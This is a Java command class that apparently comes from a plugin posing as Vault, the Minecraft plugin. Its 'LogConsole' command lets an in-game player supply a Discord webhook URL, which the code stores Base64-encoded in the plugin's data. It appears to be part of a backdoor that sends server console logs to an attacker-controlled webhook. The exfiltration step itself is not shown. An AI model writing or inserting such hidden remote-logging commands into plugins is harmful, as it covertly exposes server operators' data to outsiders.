package net.milkbowl.vault.commands.cmds;

import java.util.Base64;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.util.Settings;

public class LogConsole extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("LogConsole < discord webhook URL>"));
		} else {
			
			byte[] wh = Base64.getEncoder().encode(args[1].getBytes());
			
			DataManager.getData().set("wh", new String(wh));
			DataManager.saveData();
			p.sendMessage(Settings.PREFIX("The webhook URL has been set"));
		}
	}

}
